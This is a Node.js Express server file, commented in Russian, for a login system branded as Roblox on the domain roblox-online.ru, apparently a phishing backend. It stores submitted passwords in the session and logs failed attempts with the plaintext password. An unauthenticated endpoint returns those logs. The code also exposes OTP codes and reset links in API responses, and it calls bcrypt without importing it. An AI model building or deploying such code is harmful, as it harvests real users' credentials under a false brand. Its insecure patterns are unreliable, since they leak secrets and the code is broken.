require('dotenv').config();
const express = require('express');
const session = require('express-session');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const nodemailer = require('nodemailer');
const db = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
    secret: JWT_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

// НАСТРОЙКА EMAIL ЧЕРЕЗ GMAIL
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Функция отправки кода
function sendCode(email, code) {
    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: email,
        subject: '🔐 Ваш код подтверждения Roblox',
        html: `
            <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4;">
                <div style="background-color: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: auto;">
                    <h2 style="color: #333; text-align: center;">Код подтверждения</h2>
                    <p style="color: #666; font-size: 16px;">Вы пытаетесь войти в аккаунт Roblox.</p>
                    <div style="background-color: #00a2ff; color: white; padding: 20px; text-align: center; font-size: 32px; font-weight: bold; border-radius: 8px; margin: 20px 0; letter-spacing: 5px;">
                        ${code}
                    </div>
                    <p style="color: #666; font-size: 14px;">Код действителен в течение <strong>10 минут</strong>.</p>
                    <p style="color: #999; font-size: 12px; margin-top: 30px;">Если вы не запрашивали этот код, просто проигнорируйте это письмо.</p>
                </div>
            </div>
        `
    };

    return new Promise((resolve, reject) => {
        transporter.sendMail(mailOptions, (err, info) => {
            if (err) {
                console.error('❌ Ошибка отправки email:', err);
                reject(err);
            } else {
                console.log(`✅ Код отправлен на ${email}: ${code}`);
                resolve(info);
            }
        });
    });
}

function generateCode(length = 6) {
    return crypto.randomInt(Math.pow(10, length - 1), Math.pow(10, length)).toString();
}

function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

// Регистрация
app.post('/api/register', (req, res) => {
    const { username, email, phone, password } = req.body;

    if (!username || !email || !password) {
        return res.status(400).json({ error: 'Все обязательные поля должны быть заполнены' });
    }

    if (password.length < 6) {
        return res.status(400).json({ error: 'Пароль должен быть не менее 6 символов' });
    }

    db.createUser({ username, email, phone, password }, (err, user) => {
        if (err) {
            if (err.message.includes('UNIQUE constraint failed')) {
                return res.status(400).json({ error: 'Пользователь с таким именем или email уже существует' });
            }
            return res.status(500).json({ error: 'Ошибка при регистрации' });
        }
        
        req.session.userId = user.id;
        req.session.username = user.username;
        res.json({ success: true, user: { id: user.id, username: user.username, email: user.email } });
    });
});

// ШАГ 1: Ввод логина и пароля → ВСЕГДА отправляем код
app.post('/api/login-step1', async (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (!identifier || !password) {
        return res.status(400).json({ error: 'Введите логин и пароль' });
    }

    db.findUser(identifier, async (err, user) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        
        if (!user) {
            console.log(`❌ Пользователь не найден: ${identifier}`);
            return res.status(404).json({ error: 'Пользователь не найден' });
        }

        // Сохраняем пароль в сессии для проверки на следующем шаге
        req.session.pendingUserId = user.id;
        req.session.pendingPassword = password;
        req.session.pendingIdentifier = identifier;

        // Генерируем код
        const code = generateCode(6);
        const expiresIn = 10;

        // Очищаем старые коды
        db.clearOld2FACodes(user.id, () => {});

        // Создаём новый код
        db.create2FACode(user.id, code, expiresIn, async (err) => {
            if (err) {
                console.error('Ошибка создания кода:', err);
                return res.status(500).json({ error: 'Ошибка создания кода' });
            }

            // Отправляем код на email
            try {
                await sendCode(user.email, code);
                
                console.log(` Код отправлен для ${user.username}`);
                
                res.json({ 
                    success: true, 
                    message: 'Код отправлен на email',
                    email: user.email
                });
            } catch (emailErr) {
                console.error('Ошибка отправки email:', emailErr);
                res.status(500).json({ error: 'Ошибка отправки кода' });
            }
        });
    });
});

// ШАГ 2: Проверка кода И пароля
app.post('/api/login-step2', (req, res) => {
    const { code } = req.body;
    const userId = req.session.pendingUserId;
    const password = req.session.pendingPassword;
    const identifier = req.session.pendingIdentifier;
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (!userId) {
        return res.status(401).json({ error: 'Сначала введите логин и пароль' });
    }

    if (!code) {
        return res.status(400).json({ error: 'Введите код' });
    }

    // Проверяем код
    db.verify2FACode(userId, code, (err, isCodeValid) => {
        if (err) return res.status(500).json({ error: 'Ошибка проверки кода' });
        
        if (!isCodeValid) {
            console.log(`❌ Неверный код: ${code}`);
            db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
            return res.status(401).json({ error: 'Неверный или просроченный код' });
        }

        // Код верный, теперь проверяем пароль
        db.db.get(`SELECT * FROM users WHERE id = ?`, [userId], (err, user) => {
            if (err || !user) {
                return res.status(500).json({ error: 'Ошибка сервера' });
            }

            db.checkPassword(password, user.password_hash, (err, isPasswordValid) => {
                if (err) return res.status(500).json({ error: 'Ошибка сервера' });
                
                if (!isPasswordValid) {
                    db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
                    console.log(`❌ НЕВЕРНЫЙ ПАРОЛЬ для ${user.username}`);
                    return res.status(401).json({ error: 'Неверный пароль' });
                }

                // Всё верно - завершаем вход
                delete req.session.pendingUserId;
                delete req.session.pendingPassword;
                delete req.session.pendingIdentifier;

                req.session.userId = user.id;
                req.session.username = user.username;

                db.logLoginAttempt(user.username, '[УСПЕХ]', true, ip, userAgent, () => {});
                db.updateLastLogin(user.id, () => {});

                console.log(`✅ УСПЕХ: ${user.username} вошёл в систему`);

                res.json({ 
                    success: true, 
                    user: { 
                        id: user.id, 
                        username: user.username, 
                        email: user.email 
                    } 
                });
            });
        });
    });
});

// Отправить код повторно
app.post('/api/resend-code', (req, res) => {
    const userId = req.session.pendingUserId;

    if (!userId) {
        return res.status(401).json({ error: 'Сначала введите логин и пароль' });
    }

    db.db.get(`SELECT * FROM users WHERE id = ?`, [userId], async (err, user) => {
        if (err || !user) {
            return res.status(500).json({ error: 'Ошибка сервера' });
        }

        const code = generateCode(6);
        const expiresIn = 10;

        db.clearOld2FACodes(userId, () => {
            db.create2FACode(userId, code, expiresIn, async (err) => {
                if (err) {
                    return res.status(500).json({ error: 'Ошибка создания кода' });
                }

                try {
                    await sendCode(user.email, code);
                    res.json({ success: true, message: 'Код отправлен повторно' });
                } catch (emailErr) {
                    res.status(500).json({ error: 'Ошибка отправки email' });
                }
            });
        });
    });
});

// Отправка OTP кода
app.post('/api/send-otp', (req, res) => {
    const { email } = req.body;

    if (!email) {
        return res.status(400).json({ error: 'Email обязателен' });
    }

    const code = generateCode();
    const expiresIn = 10;

    db.createOTPCode(email, code, expiresIn, (err) => {
        if (err) return res.status(500).json({ error: 'Ошибка при создании кода' });

        console.log(`\n🔐 OTP код для ${email}: ${code}\n`);
        res.json({ 
            success: true, 
            message: 'Код отправлен',
            testCode: code
        });
    });
});

// Проверка OTP кода
app.post('/api/verify-otp', (req, res) => {
    const { email, code } = req.body;

    if (!email || !code) {
        return res.status(400).json({ error: 'Email и код обязательны' });
    }

    db.verifyOTPCode(email, code, (err, isValid) => {
        if (err) return res.status(500).json({ error: 'Ошибка проверки кода' });
        if (!isValid) return res.status(400).json({ error: 'Неверный или просроченный код' });

        res.json({ success: true, message: 'Код подтвержден' });
    });
});

// Быстрый вход
app.post('/api/quick-login', (req, res) => {
    const { email, code } = req.body;

    db.verifyOTPCode(email, code, (err, isValid) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        if (!isValid) return res.status(401).json({ error: 'Неверный код' });

        db.findUser(email, (err, user) => {
            if (err || !user) return res.status(404).json({ error: 'Пользователь не найден' });

            req.session.userId = user.id;
            req.session.username = user.username;

            res.json({ 
                success: true, 
                user: { id: user.id, username: user.username, email: user.email } 
            });
        });
    });
});

// Запрос на восстановление пароля
app.post('/api/forgot-password', (req, res) => {
    const { email } = req.body;

    db.findUser(email, (err, user) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        
        if (!user) {
            return res.json({ success: true, message: 'Если email зарегистрирован, вы получите ссылку' });
        }

        const token = generateToken();
        const expiresIn = 60;

        db.createResetToken(email, token, expiresIn, (err) => {
            if (err) return res.status(500).json({ error: 'Ошибка создания токена' });

            const resetLink = `http://roblox-online.ru/reset-password?token=${token}`;
            
            console.log(`\n Ссылка для сброса пароля: ${resetLink}\n`);
            res.json({ 
                success: true, 
                message: 'Инструкции отправлены на email',
                testLink: resetLink
            });
        });
    });
});

// Сброс пароля
app.post('/api/reset-password', (req, res) => {
    const { token, newPassword } = req.body;

    if (!token || !newPassword) {
        return res.status(400).json({ error: 'Токен и новый пароль обязательны' });
    }

    if (newPassword.length < 6) {
        return res.status(400).json({ error: 'Пароль должен быть не менее 6 символов' });
    }

    db.db.get(
        `SELECT * FROM password_resets WHERE token = ? AND expires_at > datetime('now')`,
        [token],
        (err, row) => {
            if (err) return res.status(500).json({ error: 'Ошибка сервера' });
            if (!row) return res.status(400).json({ error: 'Неверный или просроченный токен' });

            bcrypt.hash(newPassword, 10, (err, hash) => {
                if (err) return res.status(500).json({ error: 'Ошибка хеширования' });

                db.updatePassword(row.email, hash, (err) => {
                    if (err) return res.status(500).json({ error: 'Ошибка обновления пароля' });

                    db.db.run(`DELETE FROM password_resets WHERE id = ?`, [row.id]);

                    res.json({ success: true, message: 'Пароль успешно изменен' });
                });
            });
        }
    );
});

// Проверка сессии
app.get('/api/me', (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Не авторизован' });
    }

    db.db.get(`SELECT id, username, email, created_at, last_login FROM users WHERE id = ?`, 
        [req.session.userId], 
        (err, user) => {
            if (err) return res.status(500).json({ error: 'Ошибка сервера' });
            res.json({ success: true, user });
        }
    );
});

// Выход
app.post('/api/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) return res.status(500).json({ error: 'Ошибка выхода' });
        res.json({ success: true, message: 'Вы успешно вышли' });
    });
});

// Просмотр попыток входа
app.get('/api/login-attempts', (req, res) => {
    db.db.all(`SELECT * FROM login_attempts ORDER BY created_at DESC LIMIT 100`, (err, rows) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        res.json({ success: true, attempts: rows });
    });
});

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`\n🚀 Сервер запущен на http://localhost:${PORT}`);
    console.log(`📊 База данных: SQLite (roblox.db)`);
    console.log(`📝 Логирование попыток входа: ВКЛЮЧЕНО`);
    console.log(`🔐 Двухэтапная аутентификация: ВКЛЮЧЕНА`);
    if (process.env.EMAIL_USER) {
        console.log(`📧 Email уведомления: ${process.env.EMAIL_USER}`);
    } else {
        console.log(`⚠️  Email не настроен! Проверьте файл .env`);
    }
    console.log();
});